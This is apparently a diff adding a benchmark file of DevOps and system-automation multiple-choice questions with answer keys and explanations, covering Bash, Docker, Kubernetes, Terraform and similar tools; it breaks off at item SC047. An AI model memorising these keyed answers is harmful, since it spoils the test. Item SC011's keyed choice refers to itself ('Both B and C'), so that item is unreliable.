@@ -1,0 +1,1613 @@
+{
+  "agent_id": "system_coder",
+  "source": "DevOps & system automation (professional grade)",
+  "total_questions": 100,
+  "difficulty_distribution": {
+    "intermediate": 20,
+    "advanced": 50,
+    "expert": 30
+  },
+  "multi_step_count": 30,
+  "questions": [
+    {
+      "id": "SC001",
+      "question": "What does the shell option `set -u` do when enabled in a Bash script?",
+      "choices": {
+        "A": "Disables filename globbing for all subsequent commands",
+        "B": "Treats unset variables as an error and exits immediately",
+        "C": "Forces all variables to be exported to child processes",
+        "D": "Enables verbose mode, printing each command before execution"
+      },
+      "answer": "B",
+      "explanation": "The -u flag (nounset) causes the shell to treat references to unset variables as an error, causing the script to exit immediately. This catches typos and missing variable initializations.",
+      "topic": "set_options",
+      "topic_category": "bash",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC002",
+      "question": "In a Dockerfile, what is the effect of combining multiple RUN commands into a single RUN instruction using `&&`?",
+      "choices": {
+        "A": "It prevents build caching entirely for that instruction",
+        "B": "It reduces the number of image layers, resulting in a smaller final image",
+        "C": "It has no effect on the resulting image; layers are created per line, not per instruction",
+        "D": "It increases build time because Docker cannot cache intermediate steps"
+      },
+      "answer": "B",
+      "explanation": "Each RUN instruction creates a new layer. Combining commands with && into a single RUN reduces layer count and can reduce image size, especially when installing and cleaning up in the same layer.",
+      "topic": "dockerfile_layers",
+      "topic_category": "docker",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC003",
+      "question": "Which systemd command shows only log entries from the current boot for a specific service?",
+      "choices": {
+        "A": "systemctl logs myservice.service --boot",
+        "B": "systemctl journal -u myservice.service -b 0",
+        "C": "journalctl -u myservice.service -b",
+        "D": "journalctl --service myservice.service --current"
+      },
+      "answer": "C",
+      "explanation": "journalctl -u filters by unit name, and -b (or -b 0) restricts output to the current boot. The systemctl command does not have a 'logs' or 'journal' subcommand.",
+      "topic": "journalctl",
+      "topic_category": "linux",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC004",
+      "question": "In Terraform, what is the purpose of the `terraform plan` command?",
+      "choices": {
+        "A": "It initializes the Terraform working directory and downloads providers",
+        "B": "It generates and displays an execution plan showing what changes will be made",
+        "C": "It applies the configuration changes to the infrastructure immediately",
+        "D": "It validates the syntax of all .tf files without contacting any provider APIs"
+      },
+      "answer": "B",
+      "explanation": "terraform plan creates an execution plan, comparing the current state with the desired configuration and showing what actions Terraform would take. It contacts provider APIs to refresh state but makes no changes.",
+      "topic": "plan_apply_workflow",
+      "topic_category": "terraform",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC005",
+      "question": "Which Ansible module is the preferred way to manage packages on a Debian-based system?",
+      "choices": {
+        "A": "package",
+        "B": "apt",
+        "C": "pip",
+        "D": "yum"
+      },
+      "answer": "B",
+      "explanation": "The apt module is specifically designed for Debian/Ubuntu package management. While the generic 'package' module works cross-platform, 'apt' provides Debian-specific options like cache updates and is the preferred choice for Debian-based systems.",
+      "topic": "playbook_structure",
+      "topic_category": "ansible",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC006",
+      "question": "In PowerShell, what does the pipeline operator `|` pass between cmdlets?",
+      "choices": {
+        "A": "Full .NET objects with their properties and methods",
+        "B": "Byte streams similar to Unix pipes",
+        "C": "JSON-serialized data structures",
+        "D": "Raw text strings, one per line"
+      },
+      "answer": "A",
+      "explanation": "PowerShell's pipeline passes full .NET objects, not text. This allows downstream cmdlets to access properties and methods directly, which is a fundamental difference from Unix shell pipes.",
+      "topic": "pipeline",
+      "topic_category": "powershell",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC007",
+      "question": "What is the default network mode for a Docker container started with `docker run`?",
+      "choices": {
+        "A": "bridge",
+        "B": "none",
+        "C": "host",
+        "D": "overlay"
+      },
+      "answer": "A",
+      "explanation": "Docker containers default to the bridge network mode, which creates an isolated network namespace with a virtual ethernet pair connected to the docker0 bridge. The host and overlay modes must be explicitly specified.",
+      "topic": "networking",
+      "topic_category": "docker",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC008",
+      "question": "In a GitHub Actions workflow, which key specifies the events that trigger the workflow?",
+      "choices": {
+        "A": "events:",
+        "B": "when:",
+        "C": "on:",
+        "D": "triggers:"
+      },
+      "answer": "C",
+      "explanation": "GitHub Actions uses the 'on:' key at the top level of the workflow YAML to define trigger events such as push, pull_request, schedule, and workflow_dispatch.",
+      "topic": "workflow_syntax",
+      "topic_category": "cicd",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC009",
+      "question": "Which Kubernetes resource type ensures exactly one pod runs on every node in the cluster?",
+      "choices": {
+        "A": "Deployment",
+        "B": "ReplicaSet",
+        "C": "StatefulSet",
+        "D": "DaemonSet"
+      },
+      "answer": "D",
+      "explanation": "A DaemonSet ensures that a copy of a pod runs on every node (or a subset defined by node selectors). This is commonly used for log collectors, monitoring agents, and storage daemons.",
+      "topic": "workload_types",
+      "topic_category": "kubernetes",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC010",
+      "question": "What does the sticky bit do when set on a directory in Linux?",
+      "choices": {
+        "A": "All files in the directory become read-only for non-owners",
+        "B": "The directory cannot be deleted even by root until the bit is removed",
+        "C": "Only the file owner, directory owner, or root can delete or rename files within it",
+        "D": "Files created in the directory inherit the directory's group ownership"
+      },
+      "answer": "C",
+      "explanation": "The sticky bit on a directory (e.g., /tmp) restricts file deletion so that only the file's owner, the directory's owner, or root can delete or rename files within it, even if others have write permission on the directory.",
+      "topic": "file_permissions",
+      "topic_category": "linux",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC011",
+      "question": "Which SSH configuration option disables password-based authentication, requiring key-based login only?",
+      "choices": {
+        "A": "ChallengeResponseAuthentication no",
+        "B": "PasswordAuthentication no",
+        "C": "Both B and C together are required to fully disable password login",
+        "D": "AuthenticationMethods publickey"
+      },
+      "answer": "C",
+      "explanation": "Setting PasswordAuthentication no disables direct password auth, but ChallengeResponseAuthentication (keyboard-interactive) can still prompt for passwords. Both must be set to 'no' to fully disable password-based login.",
+      "topic": "ssh_hardening",
+      "topic_category": "security",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC012",
+      "question": "In Bash, what does `${variable:-default}` evaluate to when `variable` is unset?",
+      "choices": {
+        "A": "The literal string '${variable:-default}'",
+        "B": "An error because the variable is unset",
+        "C": "The string 'default'",
+        "D": "An empty string"
+      },
+      "answer": "C",
+      "explanation": "The :- parameter expansion provides a default value. If the variable is unset or null, the expression evaluates to the word after :-. Unlike := it does not assign the default to the variable.",
+      "topic": "parameter_expansion",
+      "topic_category": "bash",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC013",
+      "question": "What is the purpose of a `.dockerignore` file?",
+      "choices": {
+        "A": "It defines files that should not be included in volume mounts",
+        "B": "It specifies files and directories excluded from the build context sent to the Docker daemon",
+        "C": "It lists containers that should not be started by docker compose",
+        "D": "It prevents specific images from being pulled from a registry"
+      },
+      "answer": "B",
+      "explanation": "The .dockerignore file excludes files and directories from the build context that is sent to the Docker daemon. This reduces build context size, speeds up builds, and prevents sensitive files from being accidentally included in images.",
+      "topic": "dockerfile_best_practices",
+      "topic_category": "docker",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC014",
+      "question": "In a GitHub Actions workflow, what does `actions/cache@v4` primarily help with?",
+      "choices": {
+        "A": "Caching the repository checkout to skip git clone",
+        "B": "Caching workflow run results for faster re-runs",
+        "C": "Caching dependency files (like node_modules or pip packages) to speed up builds",
+        "D": "Caching Docker images between workflow runs"
+      },
+      "answer": "C",
+      "explanation": "actions/cache stores and restores dependency caches (e.g., npm, pip, Maven) between workflow runs using a key-based lookup, significantly reducing install times for repeated builds.",
+      "topic": "caching_strategies",
+      "topic_category": "cicd",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC015",
+      "question": "Which command displays the current iptables rules for the INPUT chain?",
+      "choices": {
+        "A": "iptables -L INPUT -n -v",
+        "B": "iptables --show INPUT",
+        "C": "iptables -S OUTPUT",
+        "D": "firewall-cmd --list-rules INPUT"
+      },
+      "answer": "A",
+      "explanation": "iptables -L lists rules, INPUT specifies the chain, -n prevents DNS lookups for faster output, and -v adds verbose information including packet and byte counters.",
+      "topic": "iptables",
+      "topic_category": "networking",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC016",
+      "question": "What is the purpose of `ansible-vault` in Ansible?",
+      "choices": {
+        "A": "Storing Ansible playbook execution history and audit logs",
+        "B": "Managing SSH key distribution across inventory hosts",
+        "C": "Creating isolated Python virtual environments for Ansible execution",
+        "D": "Encrypting sensitive data such as passwords and API keys in playbooks or variable files"
+      },
+      "answer": "D",
+      "explanation": "ansible-vault provides encryption for sensitive data at rest. It can encrypt entire files or individual variables (with vault-encrypted strings), allowing secrets to be safely stored in version control.",
+      "topic": "ansible_vault",
+      "topic_category": "ansible",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC017",
+      "question": "In Kubernetes, what is the difference between a ConfigMap and a Secret?",
+      "choices": {
+        "A": "Secrets are base64-encoded by default and intended for sensitive data; ConfigMaps store non-sensitive configuration",
+        "B": "There is no functional difference; Secret is an alias for ConfigMap",
+        "C": "ConfigMaps can only hold key-value pairs while Secrets can hold binary data",
+        "D": "ConfigMaps are stored in etcd while Secrets are stored on nodes only"
+      },
+      "answer": "A",
+      "explanation": "Secrets are base64-encoded (not encrypted by default) and designed for sensitive data like passwords and tokens. ConfigMaps hold non-sensitive configuration. Both can be mounted as volumes or environment variables.",
+      "topic": "configmaps_secrets",
+      "topic_category": "kubernetes",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC018",
+      "question": "What is the correct way to create a Git pre-commit hook that runs a linter?",
+      "choices": {
+        "A": "Add a file named `pre-commit.sh` in the repository root",
+        "B": "Add a `pre-commit` key to `package.json` scripts",
+        "C": "Add a file named `pre-commit` (no extension) in `.git/hooks/` with execute permission",
+        "D": "Configure it in `.gitconfig` under the `[hooks]` section"
+      },
+      "answer": "C",
+      "explanation": "Git hooks are executable files placed in .git/hooks/ named after the hook event (no extension). The pre-commit hook runs before each commit and can abort it by exiting with a non-zero status.",
+      "topic": "pre_commit_hooks",
+      "topic_category": "git",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC019",
+      "question": "In PowerShell, what does `$ErrorActionPreference = 'Stop'` do?",
+      "choices": {
+        "A": "Stops only the current function but continues the script",
+        "B": "Logs all errors to a file instead of the console",
+        "C": "Converts all non-terminating errors into terminating errors, allowing try/catch to handle them",
+        "D": "Suppresses all error messages from displaying"
+      },
+      "answer": "C",
+      "explanation": "Setting $ErrorActionPreference to 'Stop' converts non-terminating errors into terminating exceptions. This allows try/catch blocks to intercept errors that would otherwise only display a warning and continue execution.",
+      "topic": "error_handling",
+      "topic_category": "powershell",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC020",
+      "question": "What does `terraform init` do when run in a directory containing `.tf` files?",
+      "choices": {
+        "A": "Creates a new Terraform project from a template",
+        "B": "Downloads provider plugins, initializes the backend, and installs modules",
+        "C": "Validates all resource configurations and checks for syntax errors",
+        "D": "Generates a state file from existing infrastructure"
+      },
+      "answer": "B",
+      "explanation": "terraform init initializes the working directory by downloading required provider plugins, configuring the backend for state storage, and installing any referenced modules. It must be run before plan or apply.",
+      "topic": "plan_apply_workflow",
+      "topic_category": "terraform",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SC021",
+      "question": "What is the output of the following Bash script?\n\n```bash\nset -euo pipefail\na=\"hello world\"\necho \"${a##* }\"\n```",
+      "choices": {
+        "A": "hello",
+        "B": "hello world",
+        "C": "An error because of set -u",
+        "D": "world"
+      },
+      "answer": "D",
+      "explanation": "The ## operator removes the longest matching prefix. The pattern '* ' matches 'hello ' (everything up to and including the last space), leaving 'world'.",
+      "topic": "parameter_expansion",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC022",
+      "question": "In a multi-stage Docker build, what happens to layers from earlier stages that are not referenced by `COPY --from`?",
+      "choices": {
+        "A": "They are included in the final image but marked as hidden layers",
+        "B": "They cause a build error if not explicitly discarded with --squash",
+        "C": "They are automatically deleted from disk after the build completes",
+        "D": "They persist in the build cache but are NOT included in the final image"
+      },
+      "answer": "D",
+      "explanation": "Multi-stage builds discard all layers not carried forward via COPY --from. Earlier stage layers remain in the local build cache for future rebuilds but are not part of the final image, which only contains layers from the last stage.",
+      "topic": "multi_stage_builds",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC023",
+      "question": "What is the difference between `${var:=default}` and `${var:-default}` in Bash?",
+      "choices": {
+        "A": ":= assigns the default value to the variable if unset; :- only uses the default in the expansion without modifying the variable",
+        "B": ":- assigns the default; := only uses it in the expansion",
+        "C": ":= works only with exported variables; :- works with all variables",
+        "D": "They are identical; := is an alias for :-"
+      },
+      "answer": "A",
+      "explanation": "With :=, if the variable is unset or null, the default value is assigned to the variable AND used in the expansion. With :-, the default is only substituted in the expression; the variable itself remains unset.",
+      "topic": "parameter_expansion",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC024",
+      "question": "In Kubernetes, what is the key difference between a liveness probe and a readiness probe?",
+      "choices": {
+        "A": "Liveness probes run during startup only; readiness probes run continuously",
+        "B": "They are functionally identical but have different default timeout values",
+        "C": "Liveness probes use HTTP checks only; readiness probes use TCP checks only",
+        "D": "A failed liveness probe restarts the container; a failed readiness probe removes the pod from service endpoints"
+      },
+      "answer": "D",
+      "explanation": "A failed liveness probe causes the kubelet to restart the container (it is considered dead). A failed readiness probe removes the pod from the Service's endpoints (it is considered not ready to receive traffic) but does not restart it.",
+      "topic": "probes",
+      "topic_category": "kubernetes",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC025",
+      "question": "What does the following Terraform lifecycle block do?\n\n```hcl\nlifecycle {\n  create_before_destroy = true\n}\n```",
+      "choices": {
+        "A": "It prevents the resource from ever being destroyed by terraform destroy",
+        "B": "It creates a backup of the resource before destroying the original during updates",
+        "C": "When a resource must be replaced, the new resource is created first, then the old one is destroyed",
+        "D": "It enables blue-green deployment for the resource"
+      },
+      "answer": "C",
+      "explanation": "create_before_destroy changes the default replacement order. Normally Terraform destroys the old resource then creates the new one. With this flag, the new resource is created first, reducing downtime for resources that cannot have gaps.",
+      "topic": "lifecycle_rules",
+      "topic_category": "terraform",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC026",
+      "question": "In a systemd service unit, what does `Type=notify` indicate about the service?",
+      "choices": {
+        "A": "The service sends a readiness notification to systemd via sd_notify() when it has finished initializing",
+        "B": "The service is a one-shot process that notifies systemd upon exit",
+        "C": "The service sends desktop notifications when it starts",
+        "D": "systemd will send a signal to the service when other dependent services start"
+      },
+      "answer": "A",
+      "explanation": "Type=notify means the service will use the sd_notify() mechanism to tell systemd when it has finished starting up. Systemd considers the service 'active' only after receiving this notification, enabling accurate dependency ordering.",
+      "topic": "systemd_units",
+      "topic_category": "linux",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC027",
+      "question": "What is the correct Ansible variable precedence order (lowest to highest)?",
+      "choices": {
+        "A": "playbook vars < role defaults < inventory vars < extra vars (-e)",
+        "B": "inventory vars < role defaults < extra vars (-e) < playbook vars",
+        "C": "extra vars (-e) < playbook vars < inventory vars < role defaults",
+        "D": "role defaults < inventory vars < playbook vars < extra vars (-e)"
+      },
+      "answer": "D",
+      "explanation": "Ansible variable precedence goes from role defaults (lowest) through inventory variables, playbook variables, and up to extra vars passed via -e (highest and always win). This is a simplified view of the 22-level precedence hierarchy.",
+      "topic": "variables_precedence",
+      "topic_category": "ansible",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC028",
+      "question": "What does `trap 'cleanup' EXIT` do in a Bash script?",
+      "choices": {
+        "A": "Runs the cleanup function whenever the script exits, regardless of the reason (normal exit, error, or signal)",
+        "B": "Runs cleanup only if the script exits with a non-zero status",
+        "C": "Runs the cleanup function when the script receives SIGTERM only",
+        "D": "Prevents the script from exiting until cleanup completes, even on SIGKILL"
+      },
+      "answer": "A",
+      "explanation": "The EXIT pseudo-signal trap fires whenever the shell exits for any reason: normal completion, exit command, unhandled error with set -e, or caught signals. It cannot trap SIGKILL or SIGSTOP, but covers all other exit paths.",
+      "topic": "trap_handlers",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC029",
+      "question": "In Docker Compose, what is the difference between `volumes:` and `bind mounts` defined with a host path?",
+      "choices": {
+        "A": "Bind mounts can only be read-only; named volumes support both read and write",
+        "B": "There is no difference; both are aliases for the same mechanism",
+        "C": "Named volumes are managed by Docker and persist independently of containers; bind mounts map a specific host directory and depend on host filesystem layout",
+        "D": "Named volumes are faster because they use a copy-on-write filesystem; bind mounts do not"
+      },
+      "answer": "C",
+      "explanation": "Named volumes (e.g., 'mydata:/data') are managed by Docker, stored in /var/lib/docker/volumes, and persist independently of containers. Bind mounts (e.g., './local:/data') map a specific host path and require the host directory to exist.",
+      "topic": "volumes_bind_mounts",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC030",
+      "question": "What is the purpose of `process substitution` in Bash, as in `diff <(sort file1) <(sort file2)`?",
+      "choices": {
+        "A": "It runs both sort commands in background subshells and waits for them to complete",
+        "B": "It creates temporary named pipes (FIFOs) whose paths are substituted into the command, allowing commands that expect filenames to read from command output",
+        "C": "It redirects the output of both sort commands to a temporary file that diff reads",
+        "D": "It is syntactic sugar for piping: equivalent to `sort file1 | diff - <(sort file2)`"
+      },
+      "answer": "B",
+      "explanation": "Process substitution <() creates a temporary FIFO (or /dev/fd entry) for each command and replaces the expression with the path to that FIFO. This lets commands that require filename arguments read from process output directly.",
+      "topic": "process_substitution",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC031",
+      "question": "In Kubernetes RBAC, what is the difference between a Role and a ClusterRole?",
+      "choices": {
+        "A": "ClusterRoles provide read-only access; Roles provide read-write access",
+        "B": "Roles apply to a single namespace; ClusterRoles apply cluster-wide or to non-namespaced resources",
+        "C": "Roles are defined in YAML; ClusterRoles must be created via kubectl commands only",
+        "D": "Roles are for pods; ClusterRoles are for services"
+      },
+      "answer": "B",
+      "explanation": "A Role grants permissions within a specific namespace. A ClusterRole can grant the same permissions cluster-wide, grant access to non-namespaced resources (like nodes), or be reused across namespaces via ClusterRoleBindings.",
+      "topic": "rbac",
+      "topic_category": "kubernetes",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC032",
+      "question": "What does the following GitHub Actions syntax do?\n\n```yaml\nstrategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [18, 20]\n```",
+      "choices": {
+        "A": "Runs the job 4 times: once for each combination of os and node version",
+        "B": "Fails because matrix values must be strings, not integers",
+        "C": "Runs the job 2 times: one per OS, using all Node versions sequentially",
+        "D": "Runs the job 2 times: once on Ubuntu with Node 18 and once on Windows with Node 20"
+      },
+      "answer": "A",
+      "explanation": "A GitHub Actions matrix strategy creates a job for every combination of the matrix variables. With 2 OS options and 2 Node versions, this produces 4 jobs: (ubuntu,18), (ubuntu,20), (windows,18), (windows,20).",
+      "topic": "matrix_builds",
+      "topic_category": "cicd",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC033",
+      "question": "What is the effect of the setgid bit on a directory in Linux?",
+      "choices": {
+        "A": "All files created within the directory run with the directory owner's permissions",
+        "B": "New files and subdirectories created within inherit the directory's group, not the creator's primary group",
+        "C": "Only members of the directory's group can list its contents",
+        "D": "The directory cannot be accessed by any user outside the group"
+      },
+      "answer": "B",
+      "explanation": "The setgid bit on a directory causes new files and subdirectories to inherit the group ownership of the parent directory, rather than using the creating user's primary group. This is useful for shared project directories.",
+      "topic": "file_permissions",
+      "topic_category": "linux",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC034",
+      "question": "In Terraform, what happens when you modify a resource that already exists in the state but change an attribute that forces replacement (e.g., changing an EC2 instance's AMI)?",
+      "choices": {
+        "A": "Terraform destroys the existing resource and creates a new one with the updated attribute",
+        "B": "Terraform creates a duplicate resource alongside the original",
+        "C": "Terraform updates the attribute in-place without downtime",
+        "D": "Terraform fails with an error stating the attribute cannot be changed"
+      },
+      "answer": "A",
+      "explanation": "When a change requires replacement (marked as ForceNew in the provider schema), Terraform destroys the old resource and creates a new one. The plan output shows this as -/+ (destroy then create) unless create_before_destroy is set.",
+      "topic": "plan_apply_workflow",
+      "topic_category": "terraform",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC035",
+      "question": "What does the following Bash script output?\n\n```bash\nIFS=':' read -ra parts <<< \"a:b::d\"\necho \"${#parts[@]}\"\n```",
+      "choices": {
+        "A": "4",
+        "B": "2",
+        "C": "3",
+        "D": "An error because of the empty field"
+      },
+      "answer": "A",
+      "explanation": "Setting IFS=':' makes read split on colons. The string 'a:b::d' produces four fields: 'a', 'b', '' (empty), and 'd'. The -a flag stores them in an array, so ${#parts[@]} is 4.",
+      "topic": "ifs_manipulation",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC036",
+      "question": "In Docker, what is the security benefit of adding `--read-only` to a container run command?",
+      "choices": {
+        "A": "It mounts the container's root filesystem as read-only, preventing malware from writing to the filesystem",
+        "B": "It prevents the container from reading host filesystem files",
+        "C": "It disables write access to Docker volumes attached to the container",
+        "D": "It encrypts the container's filesystem at rest"
+      },
+      "answer": "A",
+      "explanation": "The --read-only flag makes the container's root filesystem read-only. This prevents attackers from modifying binaries, dropping malware, or tampering with configuration files. Writable directories can be selectively allowed via tmpfs or volume mounts.",
+      "topic": "security_rootless",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC037",
+      "question": "What is the purpose of a Kubernetes Horizontal Pod Autoscaler (HPA)?",
+      "choices": {
+        "A": "It adjusts the CPU and memory resource limits of existing pods",
+        "B": "It automatically scales the number of nodes in the cluster based on overall CPU usage",
+        "C": "It automatically scales the number of pod replicas based on observed CPU utilization or custom metrics",
+        "D": "It distributes traffic evenly across pods using round-robin load balancing"
+      },
+      "answer": "C",
+      "explanation": "HPA automatically adjusts the number of pod replicas in a Deployment or ReplicaSet based on observed metrics (CPU, memory, or custom metrics). It does not change resource limits on existing pods or scale nodes (that is the Cluster Autoscaler).",
+      "topic": "hpa",
+      "topic_category": "kubernetes",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC038",
+      "question": "In Ansible, what is a handler and when does it run?",
+      "choices": {
+        "A": "A handler is a task that runs before every play to set up prerequisites",
+        "B": "A handler is an error recovery block that runs when a task fails",
+        "C": "A handler is a task triggered by the `notify` directive and runs once at the end of the play, even if notified multiple times",
+        "D": "A handler runs immediately after the task that notifies it"
+      },
+      "answer": "C",
+      "explanation": "Handlers are tasks that are triggered via 'notify' and are flushed (executed) at the end of each play. If multiple tasks notify the same handler, it still only runs once. They are commonly used for service restarts after configuration changes.",
+      "topic": "handlers",
+      "topic_category": "ansible",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC039",
+      "question": "What does `set -o pipefail` add to Bash error handling beyond `set -e`?",
+      "choices": {
+        "A": "The return status of a pipeline becomes the exit status of the last (rightmost) command that failed, rather than always using the last command's status",
+        "B": "It causes the pipe to fail if any command in the pipeline writes to stderr",
+        "C": "It makes all commands in a pipeline run in the same subshell",
+        "D": "It prevents broken pipe errors when a downstream command exits early"
+      },
+      "answer": "A",
+      "explanation": "By default, a pipeline's exit status is the exit status of the last command. With pipefail, the pipeline's return status is the exit status of the last command to exit with a non-zero status, or zero if all commands succeed. Combined with set -e, this catches failures in any pipeline stage.",
+      "topic": "set_options",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC040",
+      "question": "What is the purpose of Terraform's `data` block?",
+      "choices": {
+        "A": "It defines the provider configuration for authenticating with cloud APIs",
+        "B": "It reads information from existing infrastructure or external sources without creating or managing resources",
+        "C": "It stores local variables used within the configuration",
+        "D": "It defines output values that are exported after apply"
+      },
+      "answer": "B",
+      "explanation": "Data sources (data blocks) allow Terraform to query information from existing infrastructure, external APIs, or computed values. Unlike resources, they do not create or manage infrastructure; they only read and make data available for use in other resources.",
+      "topic": "data_sources",
+      "topic_category": "terraform",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC041",
+      "question": "In a GitHub Actions workflow, what is the purpose of `environment` protection rules?",
+      "choices": {
+        "A": "They validate that the runner's environment matches specific OS requirements",
+        "B": "They require manual approval and/or specific conditions before a job targeting that environment can proceed",
+        "C": "They restrict which environment variables can be used in the workflow",
+        "D": "They prevent environment variables from being logged in workflow output"
+      },
+      "answer": "B",
+      "explanation": "Environment protection rules can require manual reviewer approval, enforce wait timers, and restrict which branches can deploy to the environment. A job referencing a protected environment pauses until all protection rules are satisfied.",
+      "topic": "environment_protection",
+      "topic_category": "cicd",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC042",
+      "question": "What is the difference between `docker compose up` and `docker compose up --build`?",
+      "choices": {
+        "A": "`--build` only builds images but does not start containers",
+        "B": "`up` uses existing images if available; `--build` forces a rebuild of all images defined with a `build:` context before starting",
+        "C": "They are identical; both always rebuild images",
+        "D": "`up` starts containers in detached mode; `--build` starts them in foreground mode"
+      },
+      "answer": "B",
+      "explanation": "docker compose up starts services using existing images. Adding --build forces Docker to rebuild images defined with a build context before starting containers, ensuring code changes are reflected. Without --build, stale images may be used.",
+      "topic": "docker_compose",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC043",
+      "question": "What does the following PowerShell command do?\n\n```powershell\nGet-ChildItem -Recurse | Where-Object { $_.Length -gt 100MB } | Select-Object FullName, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}\n```",
+      "choices": {
+        "A": "Moves files larger than 100MB to a temporary directory and logs their sizes",
+        "B": "Lists all files recursively that are larger than 100MB, showing their full path and size in megabytes",
+        "C": "Compresses files larger than 100MB and shows the compression ratio",
+        "D": "Deletes all files larger than 100MB and displays their names"
+      },
+      "answer": "B",
+      "explanation": "Get-ChildItem -Recurse lists all files, Where-Object filters for files larger than 100MB, and Select-Object outputs the full path and a calculated property 'SizeMB' that converts bytes to megabytes rounded to 2 decimal places.",
+      "topic": "pipeline",
+      "topic_category": "powershell",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC044",
+      "question": "In Linux, what information does `/proc/loadavg` contain?",
+      "choices": {
+        "A": "The average memory usage percentage over the last 15 minutes",
+        "B": "The total CPU usage percentage for each core",
+        "C": "The average disk I/O latency over the last minute",
+        "D": "The 1-minute, 5-minute, and 15-minute load averages, plus the number of running/total processes and the last PID created"
+      },
+      "answer": "D",
+      "explanation": "/proc/loadavg contains five fields: the 1, 5, and 15 minute load averages (number of processes in runnable or uninterruptible state), the count of currently running processes / total processes, and the last process ID assigned.",
+      "topic": "proc_sys",
+      "topic_category": "linux",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC045",
+      "question": "What does the `--no-new-privileges` Docker security option do?",
+      "choices": {
+        "A": "Prevents processes inside the container from gaining additional privileges via setuid/setgid binaries or capabilities",
+        "B": "Prevents the container from creating new network connections",
+        "C": "Prevents new users from being created inside the container",
+        "D": "Disables the ability to install new packages inside the container"
+      },
+      "answer": "A",
+      "explanation": "The --security-opt=no-new-privileges flag prevents processes from gaining elevated privileges through setuid/setgid binaries, capability changes, or execve. This mitigates privilege escalation attacks within containers.",
+      "topic": "security_rootless",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC046",
+      "question": "In Bash, what is the difference between `$(command)` and backticks `` `command` `` for command substitution?",
+      "choices": {
+        "A": "$() captures both stdout and stderr; backticks capture stdout only",
+        "B": "Backticks are faster because they use the parent shell directly",
+        "C": "They are identical in all respects; $() is merely cosmetic",
+        "D": "$() is the modern, recommended form that supports nesting; backticks are legacy and nesting requires awkward escaping"
+      },
+      "answer": "D",
+      "explanation": "$() is the POSIX-preferred form that supports clean nesting: $(echo $(date)). Backticks require escaped inner backticks for nesting: `echo \\`date\\``. Both capture stdout only. $() is recommended for readability and maintainability.",
+      "topic": "command_substitution",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC047",
+      "question": "In Kubernetes, what is the purpose of a `PodDisruptionBudget` (PDB)?",
+      "choices": {
+        "A": "It automatically restarts pods that exceed their resource limits",
+        "B": "It specifies the minimum number or percentage of pods that must remain available during voluntary disruptions like node drains",
+        "C": "It prevents pods from being scheduled on nodes with insufficient resources",
+        "D": "It limits the CPU and memory a pod can consume"
+      },
+      "answer": "B",
